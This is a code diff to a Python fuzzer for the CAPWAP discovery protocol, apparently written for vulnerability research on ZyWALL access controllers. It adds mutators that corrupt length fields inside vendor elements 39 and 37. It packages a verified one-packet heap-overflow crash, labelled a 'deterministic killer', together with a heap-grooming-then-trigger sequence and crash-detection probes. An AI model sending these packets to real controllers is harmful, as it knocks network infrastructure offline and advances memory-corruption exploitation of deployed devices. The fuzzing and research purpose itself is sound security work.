@@ -32,11 +32,12 @@ from __future__ import annotations
 import hashlib
 import json
 import socket
+import struct
 import time
 from pathlib import Path
 from typing import Callable
 
-from capwap_discovery_fuzzer.stage_fuzzer import _element_offsets, _hlen
+from capwap_discovery_fuzzer.stage_fuzzer import _element_offsets, _hlen, _patch_element
 from capwap_discovery_fuzzer.vendors.cisco.creator import ApIdentity, CiscoPayloadCreator
 from capwap_discovery_fuzzer.vendors.cisco.elements import CISCO_VENDOR_ID
 from capwap_discovery_fuzzer.vendors.zywall.creator import ZywallIdentity, ZywallPayloadCreator
@@ -207,6 +208,17 @@ def _len_elem_overrun(target_type: int):
 
 #: registry default: Cisco element 38 (WTP Board Data) — unchanged behavior
 _m_len_elem_overrun = _len_elem_overrun(38)
+
+#: variants that only make sense against a ZyWALL seed (t39/t37 internals);
+#: _builder_for substitutes a pass-through on non-ZyWALL identities so
+#: ``--variants all`` keeps working on Cisco targets.
+ZYWALL_ONLY_VARIANTS = frozenset({
+    "t39-len2-joint", "t39-len1-joint", "t39-len2-band", "t39-len1-band",
+    "t39-len2-ship-short", "t39-flags-shift", "t39-flags-pad",
+    "t39-str1-pattern", "t39-gate-boundary", "t39-modelid-sweep",
+    "t37-subelem-sweep", "elem-dup-t39", "elem-swap-39-37", "elem-drop-t39",
+    "datagram-trunc-t39",
+})
 
 
 def _m_len_hlen_mismatch(seed: bytes, rng) -> tuple[list[bytes], dict]:
@@ -420,6 +432,399 @@ def _m_classic_random(seed: bytes, rng) -> tuple[list[bytes], dict]:
                           "cite": "existing element-level generator (M6)"}
 
 
+# --------------------------------------------------------------------------
+# m7 — vendor-inner mutation (ZyWALL element 39/37 Value internals).
+#
+# Field authority: vendors/zywall/elements.py docstring (capwap_msg_get_t39
+# @ capwap_srv 0x100417f8, in-loop calibrated 2026-09-23).  Honest layout
+# (flags==0): len1@+19, str1@+21, len2@+27+len1, str2@+29+len1.  The AC's
+# capwap_msg_get_t39 memcpy's str1/str2 into fixed 33-byte heap fields with a
+# single gate "declared length <= element TLV Len" (capwap_msg.c:2286 gate;
+# F2 2026-09-23: directed packet with len2=0x4000 + TLV=0xFFFF = one-packet
+# SIGSEGV).  flags!=0 makes the parser swallow +3..+5, shifting every later
+# field by 3 bytes — content bytes then get read as lengths (F1's accidental
+# hit).  On non-ZyWALL seeds these variants are vendor-skipped via
+# _builder_for; a ZyWALL seed without the element degrades to a pass-through.
+
+INTERESTING_U16 = (34, 0x40, 0x100, 0x400, 0x1000, 0x4000, 0xFFFF)
+
+#: known t37 fish sub-element ids and their fixed read lengths (field table
+#: §Discovery(1) element 37; unknown ids abort the container walk)
+T37_SUBELEM_LENS = {0x3: 8, 0x6: 24, 0x13: 4, 0x14: 4, 0x15: 4, 0x16: 256,
+                    0x17: 4, 0x18: 4, 0x1A: 4, 0x1C: 8, 0x1D: 32}
+
+
+def _m_vendor_skip(seed: bytes, rng) -> tuple[list[bytes], dict]:
+    return [seed], {"op": "vendor-skip",
+                    "note": "zywall-only variant on a non-zywall seed"}
+
+
+def _find_elem(raw: bytes, etype: int) -> int | None:
+    for i, (t, _s, _l) in enumerate(_element_offsets(raw)):
+        if t == etype:
+            return i
+    return None
+
+
+def _t39_value(raw: bytes) -> tuple[int, memoryview | bytes]:
+    """(element index, value bytes) of the honest-layout t39 element."""
+    idx = _find_elem(raw, 39)
+    if idx is None:
+        return None, b""
+    _t, start, elen = _element_offsets(raw)[idx]
+    return idx, raw[start + 4:start + 4 + elen]
+
+
+def _zy_t39_geom(value: bytes) -> dict:
+    """Offsets of an honest-layout (flags==0) t39 value per the field table."""
+    if len(value) < 30 or value[2] != 0:
+        raise ValueError("t39 inner mutators need the honest layout (flags==0)")
+    len1 = int.from_bytes(value[19:21], "big")
+    if 21 + len1 + 8 > len(value):
+        raise ValueError("t39 len1 out of the honest value bounds")
+    return {"len1": len1, "len2": int.from_bytes(value[27 + len1:29 + len1], "big"),
+            "l2_off": 27 + len1, "str2_off": 29 + len1}
+
+
+def _t39_mutate(seed: bytes, *, flags: int | None = None,
+                max_radios: int | None = None, used_radios: int | None = None,
+                model_id: int | None = None, l1: int | None = None,
+                l2: int | None = None, str1_pattern: bytes | None = None,
+                pad3_after_flags: bool = False, drop_str2: bool = False,
+                tlv_len: int | None = None) -> bytes:
+    """Patch t39 value internals on an honest seed; TLV/MsgElemsLen follow
+    the new value length honestly unless ``tlv_len`` overrides the TLV."""
+    idx = _find_elem(seed, 39)
+    if idx is None:
+        return seed
+    _t, start, elen = _element_offsets(seed)[idx]
+    v = bytearray(seed[start + 4:start + 4 + elen])
+    try:
+        g = _zy_t39_geom(bytes(v))
+    except ValueError:
+        return seed
+    if pad3_after_flags:
+        # flags!=0 shifts the parser cursor +3; inserting 3 filler bytes
+        # realigns the honest layout downstream (negative control).
+        v = v[:3] + b"\x00\x00\x00" + v[3:]
+    if flags is not None:
+        v[2] = flags & 0xFF
+    if max_radios is not None:
+        v[0] = max_radios & 0xFF
+    if used_radios is not None:
+        v[1] = used_radios & 0xFF
+    if model_id is not None:
+        v[11:13] = (model_id & 0xFFFF).to_bytes(2, "big")
+    if l1 is not None:
+        v[19:21] = (l1 & 0xFFFF).to_bytes(2, "big")
+    if str1_pattern is not None:
+        v[21:21 + g["len1"]] = str1_pattern[:g["len1"]]
+    if l2 is not None:
+        v[g["l2_off"]:g["l2_off"] + 2] = (l2 & 0xFFFF).to_bytes(2, "big")
+    if drop_str2:
+        v = v[:g["str2_off"]]
+    out = _patch_element(seed, idx, bytes(v))
+    if tlv_len is not None:
+        out = _set_elem_len(out, idx, tlv_len)
+    return out
+
+
+def _m_t39_len2_joint(seed: bytes, rng) -> tuple[list[bytes], dict]:
+    """Deterministic killer (F2-verified): declared str2 length 0x4000 into
+    the 33-byte heap field, TLV inflated to open the sole gate."""
+    out = _t39_mutate(seed, l2=0x4000, tlv_len=0xFFFF)
+    return [out], {"op": "t39-len2-joint", "l2": 0x4000, "tlv": 0xFFFF,
+                   "cite": "capwap_msg_get_t39+1040: memcpy(struct+2446[33B], "
+                           "cursor, l2), sole gate l2<=TLV (F2 2026-09-23)"}
+
+
+def _m_t39_len1_joint(seed: bytes, rng) -> tuple[list[bytes], dict]:
+    out = _t39_mutate(seed, l1=0x4000, tlv_len=0xFFFF)
+    return [out], {"op": "t39-len1-joint", "l1": 0x4000, "tlv": 0xFFFF,
+                   "cite": "capwap_msg_get_t39+724: memcpy(struct+2413[33B], "
+                           "cursor, l1), sole gate l1<=TLV"}
+
+
+def _m_t39_len2_band(seed: bytes, rng) -> tuple[list[bytes], dict]:
+    l2 = rng.choice(INTERESTING_U16)
+    inflate = rng.choice([True, False])
+    out = _t39_mutate(seed, l2=l2, tlv_len=0xFFFF if inflate else None)
+    return [out], {"op": "t39-len2-band", "l2": l2,
+                   "tlv": 0xFFFF if inflate else "honest"}
+
+
+def _m_t39_len1_band(seed: bytes, rng) -> tuple[list[bytes], dict]:
+    l1 = rng.choice(INTERESTING_U16)
+    inflate = rng.choice([True, False])
+    out = _t39_mutate(seed, l1=l1, tlv_len=0xFFFF if inflate else None)
+    return [out], {"op": "t39-len1-band", "l1": l1,
+                   "tlv": 0xFFFF if inflate else "honest"}
+
+
+def _m_t39_len2_ship_short(seed: bytes, rng) -> tuple[list[bytes], dict]:
+    """Declared len2 far beyond the bytes actually shipped — the read-side
+    (MAPERR) form of the same unbounded copy."""
+    out = _t39_mutate(seed, l2=0x8000, tlv_len=0xFFFF, drop_str2=True)
+    return [out], {"op": "t39-len2-ship-short", "l2": 0x8000, "tlv": 0xFFFF,
+                   "shipped_str2_bytes": 0}
+
+
+def _m_t39_flags_shift(seed: bytes, rng) -> tuple[list[bytes], dict]:
+    """flags!=0 (swallow +3..+5) with the honest layout untouched — the
+    parser then reads len1 from str1 content bytes (content-as-length)."""
+    flags = rng.choice([1, 0x7F, 0x80, 0xFF])
+    out = _t39_mutate(seed, flags=flags, tlv_len=0xFFFF)
+    return [out], {"op": "t39-flags-shift", "flags": flags, "tlv": 0xFFFF,
+                   "cite": "flags!=0 swallows value[3..5]; F1 accidental hit "
+                           "mechanism, automated"}
+
+
+def _m_t39_flags_pad(seed: bytes, rng) -> tuple[list[bytes], dict]:
+    """Negative control: flags!=0 plus 3 filler bytes — the shifted cursor
+    realigns with the honest layout, so the parse must stay harmless."""
+    out = _t39_mutate(seed, flags=0xFF, pad3_after_flags=True)
+    return [out], {"op": "t39-flags-pad", "flags": 0xFF, "pad_bytes": 3,
+                   "expect": "no-crash (gate-semantics control)"}
+
+
+def _m_t39_str1_pattern(seed: bytes, rng) -> tuple[list[bytes], dict]:
+    """Grooming pattern in str1 (declared length honest) — overflow content
+    control for the copy destinations / residual buffer (F2 grooming)."""
+    pat = rng.choice([b"\xff\x7f", b"\x00\x01", b"\x41\x41"]) * 8
+    out = _t39_mutate(seed, str1_pattern=pat)
+    return [out], {"op": "t39-str1-pattern", "pattern": pat[:2].hex(),
+                   "declared_len1": "honest"}
+
+
+def _m_t39_gate_boundary(seed: bytes, rng) -> tuple[list[bytes], dict]:
+    mx, used = rng.choice([(0, 0), (1, 0), (2, 0), (2, 3), (4, 4), (5, 5),
+                           (4, 255), (255, 255)])
+    out = _t39_mutate(seed, max_radios=mx, used_radios=used)
+    return [out], {"op": "t39-gate-boundary", "max_radios": mx, "used": used,
+                   "cite": "admission gates 0<Max<5, 0<Used<=Max edges"}
+
+
+def _m_t39_modelid_sweep(seed: bytes, rng) -> tuple[list[bytes], dict]:
+    mid = rng.choice([0, 0x26E0, 0x26E2, 0xFFFF])
+    out = _t39_mutate(seed, model_id=mid)
+    return [out], {"op": "t39-modelid-sweep", "model_id": hex(mid)}
+
+
+def _m_t37_subelem_sweep(seed: bytes, rng) -> tuple[list[bytes], dict]:
+    """Append one known-id fish sub-element with a truncated value — every
+    known id is a fixed-length read with no bounds check (overread family)."""
+    idx = _find_elem(seed, 37)
+    if idx is None:
+        return [seed], {"op": "t37-subelem-sweep", "skipped": "no element 37"}
+    sub_id = rng.choice(sorted(T37_SUBELEM_LENS))
+    full = T37_SUBELEM_LENS[sub_id]
+    vlen = rng.choice([full, full - 1, max(1, full // 2)])
+    _t, start, elen = _element_offsets(seed)[idx]
+    v = bytes(seed[start + 4:start + 4 + elen]) \
+        + struct.pack(">H", sub_id) + b"\x5a" * vlen
+    out = _patch_element(seed, idx, v)
+    return [out], {"op": "t37-subelem-sweep", "sub_id": hex(sub_id),
+                   "vlen": vlen, "fixed_read_len": full}
+
+
+# --------------------------------------------------------------------------
+# m8 — element-level structural operations on the discovery frame
+
+def _m_elem_len_shrink(seed: bytes, rng) -> tuple[list[bytes], dict]:
+    """Shrink an element's declared TLV length below its actual bytes — the
+    parser trusts declarations, so walks/skips cross element boundaries."""
+    etype = rng.choice([39, 37])
+    idx = _find_elem(seed, etype)
+    if idx is None:
+        return [seed], {"op": "elem-len-shrink", "skipped": f"no element {etype}"}
+    _t, _s, elen = _element_offsets(seed)[idx]
+    k = rng.choice([1, 2, 3, 4, 8])
+    new = max(0, elen - k)
+    out = _set_elem_len(seed, idx, new)
+    return [out], {"op": "elem-len-shrink", "elem_type": etype,
+                   "old_len": elen, "new_len": new}
+
+
+def _m_len_tiny_band(seed: bytes, rng) -> tuple[list[bytes], dict]:
+    actual = _get_msgelemslen(seed)
+    delta = rng.choice([None, None, -3, -2, -1, 1, 2, 3])
+    if delta is None:
+        new = rng.choice([0, 1, 2, 3, 4])
+    else:
+        new = max(0, min(0xFFFF, actual + delta))
+    out = _set_msgelemslen(seed, new)
+    return [out], {"op": "len-tiny-band", "old": actual, "new": new,
+                   "cite": "ZyWALL Len counts net elements (+3 semantics); "
+                           "±1..3 is the fencepost band"}
+
+
+def _m_elem_dup_t39(seed: bytes, rng) -> tuple[list[bytes], dict]:
+    idx = _find_elem(seed, 39)
+    if idx is None:
+        return [seed], {"op": "elem-dup-t39", "skipped": "no element 39"}
+    _t, start, elen = _element_offsets(seed)[idx]
+    value = seed[start + 4:start + 4 + elen]
+    out = _append_element(seed, 39, value)
+    return [out], {"op": "elem-dup-t39", "cite": "duplicate wtpInfo writer"}
+
+
+def _m_elem_swap_39_37(seed: bytes, rng) -> tuple[list[bytes], dict]:
+    i39, i37 = _find_elem(seed, 39), _find_elem(seed, 37)
+    if i39 is None or i37 is None:
+        return [seed], {"op": "elem-swap-39-37", "skipped": "seed lacks 39/37"}
+    elems = _element_offsets(seed)
+    blocks = [seed[s:s + 4 + l] for _t, s, l in elems]
+    blocks[i39], blocks[i37] = blocks[i37], blocks[i39]
+    head = seed[:_ctrl_off(seed) + 8]
+    out = head + b"".join(blocks)  # same total length ⇒ MsgElemsLen valid
+    return [out], {"op": "elem-swap-39-37"}
+
+
+def _m_elem_drop_t39(seed: bytes, rng) -> tuple[list[bytes], dict]:
+    idx = _find_elem(seed, 39)
+    if idx is None:
+        return [seed], {"op": "elem-drop-t39", "skipped": "no element 39"}
+    out = _patch_element(seed, idx, None)
+    return [out], {"op": "elem-drop-t39",
+                   "cite": "gate starvation: Max/Used/IANA read zeros"}
+
+
+def _m_elem_tail_garbage(seed: bytes, rng) -> tuple[list[bytes], dict]:
+    n = rng.choice([1, 2, 4, 8, 16])
+    out = _set_msgelemslen(seed + b"\xa5" * n, _get_msgelemslen(seed) + n)
+    return [out], {"op": "elem-tail-garbage", "n": n,
+                   "cite": "declared-area tail bytes after the last element"}
+
+
+def _m_datagram_trunc(seed: bytes, rng) -> tuple[list[bytes], dict]:
+    """Cut the frame right after t39's len2 field — declared lengths still
+    describe the full structure, actual bytes stop mid-element."""
+    idx = _find_elem(seed, 39)
+    if idx is None:
+        return [seed], {"op": "datagram-trunc-t39", "skipped": "no element 39"}
+    _t, start, _elen = _element_offsets(seed)[idx]
+    v = seed[start + 4:]
+    try:
+        g = _zy_t39_geom(v)
+    except ValueError:
+        return [seed], {"op": "datagram-trunc-t39", "skipped": "layout"}
+    cut = start + 4 + g["l2_off"] + 2
+    return [seed[:cut]], {"op": "datagram-trunc-t39", "cut_at": cut,
+                          "declared": "unchanged (complete)", "actual": cut}
+
+
+# --------------------------------------------------------------------------
+# m9 — stacked mutations, grooming sequences, length-field dictionary
+
+def _m_groom_then_trigger(seed: bytes, rng) -> tuple[list[bytes], dict]:
+    """Grooming sequence (F2: pattern packets steer the overflow content and
+    can flip the fault form) followed by the deterministic killer."""
+    pattern = _t39_mutate(seed, str1_pattern=b"\xff\x7f" * 8)
+    trigger = _t39_mutate(seed, l2=0x4000, tlv_len=0xFFFF)
+    return [pattern, pattern, pattern, trigger], {
+        "op": "groom-then-trigger", "groom_rounds": 3,
+        "pattern": "ff7f", "trigger": {"l2": 0x4000, "tlv": 0xFFFF}}
+
+
+def _m_magic_dix_len_fields(seed: bytes, rng) -> tuple[list[bytes], dict]:
+    """Write one interesting value into one length-ish field (dictionary
+    method: boundary lengths + the target's magic flags byte)."""
+    target = rng.choice(["msgelemslen", "tlv39", "tlv37", "l1", "l2"])
+    val = rng.choice([0, 1, 0x7F, 0x80, 0xFF, 0x7FFF, 0xFFFF])
+    if target == "msgelemslen":
+        return [_set_msgelemslen(seed, val)], {
+            "op": "magic-dict-len", "field": "msgelemslen", "value": val}
+    if target in ("tlv39", "tlv37"):
+        etype = 39 if target == "tlv39" else 37
+        idx = _find_elem(seed, etype)
+        if idx is None:
+            return [seed], {"op": "magic-dict-len", "skipped": target}
+        return [_set_elem_len(seed, idx, val)], {
+            "op": "magic-dict-len", "field": target, "value": val}
+    out = _t39_mutate(seed, **({"l1": val} if target == "l1" else {"l2": val}))
+    return [out], {"op": "magic-dict-len", "field": target, "value": val}
+
+
+def _havoc_primitives() -> list:
+    """(name, fn(raw, rng) -> (raw, desc)) pool for stacked-havoc."""
+    def inflate(etype):
+        def f(raw, rng):
+            idx = _find_elem(raw, etype)
+            if idx is None:
+                return raw, f"skip-tlv{etype}"
+            return _set_elem_len(raw, idx, 0xFFFF), f"tlv{etype}:=FFFF"
+        return f
+
+    def inner(field):
+        def f(raw, rng):
+            val = rng.choice(INTERESTING_U16)
+            out = _t39_mutate(raw, **{field: val})
+            return out, f"{field}:={val:#x}"
+        return f
+
+    def flags_f(raw, rng):
+        val = rng.choice([1, 0x7F, 0x80, 0xFF])
+        return _t39_mutate(raw, flags=val), f"flags:={val:#x}"
+
+    def elems_tiny(raw, rng):
+        return _set_msgelemslen(raw, rng.choice([0, 1, 2, 3, 4])), "msgelemslen:=tiny"
+
+    def msgtype5(raw, rng):
+        return _set_msgtype(raw, 5), "msgtype:=5"
+
+    def insert_bytes(raw, rng):
+        elems = _element_offsets(raw)
+        if not elems:
+            return raw, "skip-insert"
+        _t, start, _l = elems[rng.randrange(len(elems))]
+        k = rng.randint(1, 4)
+        return raw[:start] + b"\x41" * k + raw[start:], f"ins{k}@{start}"
+
+    def delete_bytes(raw, rng):
+        elems = _element_offsets(raw)
+        if not elems:
+            return raw, "skip-del"
+        _t, start, _l = elems[rng.randrange(len(elems))]
+        k = rng.randint(1, 4)
+        return raw[:start] + raw[start + k:], f"del{k}@{start}"
+
+    def dup_t39(raw, rng):
+        idx = _find_elem(raw, 39)
+        if idx is None:
+            return raw, "skip-dup"
+        _t, start, elen = _element_offsets(raw)[idx]
+        return _append_element(raw, 39, raw[start + 4:start + 4 + elen]), "dup39"
+
+    def shrink(raw, rng):
+        etype = rng.choice([37, 39])
+        idx = _find_elem(raw, etype)
+        if idx is None:
+            return raw, "skip-shrink"
+        _t, _s, elen = _element_offsets(raw)[idx]
+        k = rng.randint(1, 3)
+        return _set_elem_len(raw, idx, max(0, elen - k)), f"tlv{etype}-={k}"
+
+    return [("tlv39:=FFFF", inflate(39)), ("tlv37:=FFFF", inflate(37)),
+            ("l1-interesting", inner("l1")), ("l2-interesting", inner("l2")),
+            ("flags-nonzero", flags_f), ("msgelemslen-tiny", elems_tiny),
+            ("msgtype:=5", msgtype5), ("insert-bytes", insert_bytes),
+            ("delete-bytes", delete_bytes), ("dup-t39", dup_t39),
+            ("shrink-tlv", shrink)]
+
+
+def _m_stacked_havoc(seed: bytes, rng) -> tuple[list[bytes], dict]:
+    """2-6 stacked random operators per round (AFL havoc style) — single-op
+    variants cannot reach coupled conditions (child len + parent cap)."""
+    prims = _havoc_primitives()
+    n = rng.randint(2, 6)
+    raw, applied = seed, []
+    for _ in range(n):
+        name, fn = prims[rng.randrange(len(prims))]
+        raw, d = fn(raw, rng)
+        applied.append(d)
+    return [raw], {"op": "stacked-havoc", "n_ops": n, "ops": applied}
+
+
 #: ordered registry: variant name -> (layer, builder)
 MUTATORS: dict[str, tuple[str, Mutator]] = {}
 for _name, _layer, _fn in [
@@ -458,6 +863,30 @@ for _name, _layer, _fn in [
     ("seq-jump", "m5", _m_seq_jump),
     ("seq-dup", "m5", _m_seq_dup),
     ("classic-random", "m6", _m_classic_random),
+    # m7 — vendor-inner (ZyWALL t39/t37 Value internals; F2 2026-09-23)
+    ("t39-len2-joint", "m7", _m_t39_len2_joint),
+    ("t39-len1-joint", "m7", _m_t39_len1_joint),
+    ("t39-len2-band", "m7", _m_t39_len2_band),
+    ("t39-len1-band", "m7", _m_t39_len1_band),
+    ("t39-len2-ship-short", "m7", _m_t39_len2_ship_short),
+    ("t39-flags-shift", "m7", _m_t39_flags_shift),
+    ("t39-flags-pad", "m7", _m_t39_flags_pad),
+    ("t39-str1-pattern", "m7", _m_t39_str1_pattern),
+    ("t39-gate-boundary", "m7", _m_t39_gate_boundary),
+    ("t39-modelid-sweep", "m7", _m_t39_modelid_sweep),
+    ("t37-subelem-sweep", "m7", _m_t37_subelem_sweep),
+    # m8 — element-level structural operations
+    ("elem-len-shrink", "m8", _m_elem_len_shrink),
+    ("len-tiny-band", "m8", _m_len_tiny_band),
+    ("elem-dup-t39", "m8", _m_elem_dup_t39),
+    ("elem-swap-39-37", "m8", _m_elem_swap_39_37),
+    ("elem-drop-t39", "m8", _m_elem_drop_t39),
+    ("elem-tail-garbage", "m8", _m_elem_tail_garbage),
+    ("datagram-trunc-t39", "m8", _m_datagram_trunc),
+    # m9 — stacked / grooming / dictionary
+    ("groom-then-trigger", "m9", _m_groom_then_trigger),
+    ("magic-dict-len", "m9", _m_magic_dix_len_fields),
+    ("stacked-havoc", "m9", _m_stacked_havoc),
 ]:
     MUTATORS[_name] = (_layer, _fn)
 
@@ -529,7 +958,8 @@ class DiscoveryStageFuzzer:
                  identities: tuple, variants: list[str],
                  rounds_per_variant: int, seed: int | None = None,
                  response_timeout: float = 3.0, round_gap: float = 1.0,
-                 datagram_gap: float = 0.03):
+                 datagram_gap: float = 0.03, probe: bool = True,
+                 probe_timeout: float = 0.7):
         import random
         self.ac_addr = ac_addr
         self.out_dir = Path(out_dir)
@@ -541,6 +971,8 @@ class DiscoveryStageFuzzer:
         self.response_timeout = response_timeout
         self.round_gap = round_gap
         self.datagram_gap = datagram_gap
+        self.probe = probe
+        self.probe_timeout = probe_timeout
         # ZyWALL MsgElemsLen excludes the 3-byte Length field itself
         # (RFC §4.5.1.3 wording includes it; measured +3 on every reply).
         self.canary_pad = 3 if any(
@@ -561,10 +993,45 @@ class DiscoveryStageFuzzer:
     def _builder_for(variant: str, default: "Mutator", identity) -> "Mutator":
         """Vendor-aware builder: len-elem-overrun targets the identity
         element of the seed's vendor — 38 (WTP Board Data) for Cisco,
-        39 (WTP Descriptor) for ZyWALL; everything else is vendor-neutral."""
+        39 (WTP Descriptor) for ZyWALL; the m7 t39/t37-internals variants
+        pass through untouched on non-ZyWALL seeds."""
         if variant == "len-elem-overrun" and isinstance(identity, ZywallIdentity):
             return _len_elem_overrun(39)
+        if variant in ZYWALL_ONLY_VARIANTS and not isinstance(identity, ZywallIdentity):
+            return _m_vendor_skip
         return default
+
+    def _probe(self, seq: int) -> tuple[bool, bytes | None]:
+        """Primary Discovery (19) liveness probe — the (c)-plan oracle:
+        the AC answers this with zero element validation, so silence means
+        the daemon died (crash suspect)."""
+        pkt = bytes.fromhex("0010000000000000") + (19).to_bytes(4, "big") \
+            + bytes([seq & 0xFF]) + b"\x00\x03\x00"
+        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
+            sock.settimeout(self.probe_timeout)
+            sock.sendto(pkt, self.ac_addr)
+            try:
+                data, _ = sock.recvfrom(65535)
+                return True, data
+            except (socket.timeout, ConnectionResetError, OSError):
+                return False, None
+
+    def _record_crash(self, round_no: int, variant: str, datagrams: list[bytes],
+                      desc: dict, alive: bool) -> Path:
+        """Persist one crash-suspect round: full datagram bytes + mutation +
+        probe state — the minimal single-input attribution record."""
+        cdir = self.out_dir / "crash"
+        cdir.mkdir(parents=True, exist_ok=True)
+        path = cdir / f"round{round_no:05d}-{variant}.json"
+        path.write_text(json.dumps({
+            "ts": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
+            "round": round_no, "variant": variant, "mutation": desc,
+            "probe_alive_after": alive,
+            "datagrams_hex": [d.hex() for d in datagrams],
+            "ac": f"{self.ac_addr[0]}:{self.ac_addr[1]}",
+            "seed": self.seed_value,
+        }, ensure_ascii=False, indent=2), encoding="utf-8")
+        return path
 
     def _exchange(self, datagrams: list[bytes]) -> tuple[bytes | None, str]:
         """Send the round's datagrams from a fresh source port; wait once."""
@@ -592,12 +1059,18 @@ class DiscoveryStageFuzzer:
         started = time.time()
         per_variant: dict[str, dict] = {}
         round_no = 0
+        crash_files: list[str] = []
+        # baseline probe: a round-1 kill must also be recorded, and a target
+        # that was never alive must not smear crash_suspect over every round
+        prev_alive: bool | None = None
+        if self.probe:
+            prev_alive, _ = self._probe(0)
         with jsonl_path.open("a", encoding="utf-8") as jf:
             for variant in self.variants:
                 layer, builder = MUTATORS[variant]
                 stat = per_variant.setdefault(variant, {
                     "layer": layer, "rounds": 0, "answered": 0, "silent": 0,
-                    "leak_suspect": 0, "resp_msgtypes": {}})
+                    "leak_suspect": 0, "crash_suspect": 0, "resp_msgtypes": {}})
                 for _ in range(self.rounds_per_variant):
                     round_no += 1
                     identity = self.identities[(round_no - 1) % len(self.identities)]
@@ -607,6 +1080,15 @@ class DiscoveryStageFuzzer:
                     reply, addr = self._exchange(datagrams)
                     canary = canary_check(reply, self.canary_pad) if reply else None
                     outcome = "answered" if reply else "silence"
+                    alive, _probe_reply = self._probe(round_no) if self.probe \
+                        else (True, None)
+                    crash_suspect = bool(self.probe and prev_alive and not alive)
+                    if crash_suspect:
+                        crash_files.append(str(self._record_crash(
+                            round_no, variant, datagrams, desc, alive)))
+                        stat["crash_suspect"] += 1
+                    if self.probe:
+                        prev_alive = alive
                     stat["rounds"] += 1
                     stat["answered" if reply else "silent"] += 1
                     if canary and canary.get("leak_suspect"):
@@ -626,7 +1108,10 @@ class DiscoveryStageFuzzer:
                         "outcome": outcome,
                         "n_datagrams": len(datagrams),
                         "req_sha256": hashlib.sha256(datagrams[0]).hexdigest(),
+                        "req_hex": datagrams[0].hex(),
                         "mutation": desc,
+                        "probe_alive": alive if self.probe else None,
+                        "crash_suspect": crash_suspect,
                         "resp_addr": addr,
                         "resp_len": len(reply) if reply else 0,
                         "resp_sha256": hashlib.sha256(reply).hexdigest() if reply else None,
@@ -646,11 +1131,13 @@ class DiscoveryStageFuzzer:
             "rounds_per_variant": self.rounds_per_variant,
             "identities": [i.ap_mac.hex() for i in self.identities],
             "variants": per_variant,
+            "crash_files": crash_files,
             "totals": {
                 "rounds": sum(s["rounds"] for s in per_variant.values()),
                 "answered": sum(s["answered"] for s in per_variant.values()),
                 "silent": sum(s["silent"] for s in per_variant.values()),
                 "leak_suspect": sum(s["leak_suspect"] for s in per_variant.values()),
+                "crash_suspect": sum(s["crash_suspect"] for s in per_variant.values()),
             },
         }
         summary_path.write_text(json.dumps(summary, ensure_ascii=False, indent=2),
